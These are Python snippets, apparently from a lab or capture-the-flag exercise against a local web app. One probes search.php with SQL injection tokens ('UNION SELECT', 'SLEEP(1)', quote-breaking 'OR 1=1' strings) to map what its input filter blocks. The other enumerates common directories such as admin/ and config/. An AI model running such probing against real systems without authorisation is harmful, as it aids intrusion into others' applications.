import urllib.request, urllib.parse
base='http://localhost:8080/search.php'

def test(s):
    data=urllib.parse.urlencode({'username':s}).encode()
    req=urllib.request.Request(base,data=data)
    with urllib.request.urlopen(req) as r:
        body=r.read().decode('latin1','ignore')
        if 'filtered' in body.lower():
            return 'FILTERED'
        elif 'User exists' in body:
            return 'HIT'
        elif 'No results' in body:
            return 'NORES'
        else:
            return 'OTHER'

cands=['or','OR','oR','||','and','AND','&&','union','select','UNION SELECT','sleep','SLEEP(1)','benchmark(1000000,md5(1))','--','/*','*/','#',' like ','rlike','regexp','concat','substr','substring','=','1=1','" OR "1"="1','\' OR \'1\'=\'1','`',';','\\0']
for c in cands:
    res=test(c)
    print(res, repr(c))

import urllib.request, urllib.error
base='http://localhost:8080/'
dirs=['admin/','includes/','inc/','lib/','classes/','assets/','css/','js/','images/','img/','uploads/','upload/','tmp/','logs/','private/','server/','api/','config/','core/','vendor/','database/','data/']
for d in dirs:
    url=base+d
    try:
        r=urllib.request.urlopen(url,timeout=5)
        code=r.getcode(); data=r.read(200)
        print(code, d, '->', data[:80].decode('latin1','ignore').replace('\n',' '))
    except urllib.error.HTTPError as e:
        print(e.code, d)
    except Exception as e:
        print('ERR', d, e)

import urllib.request, urllib.parse
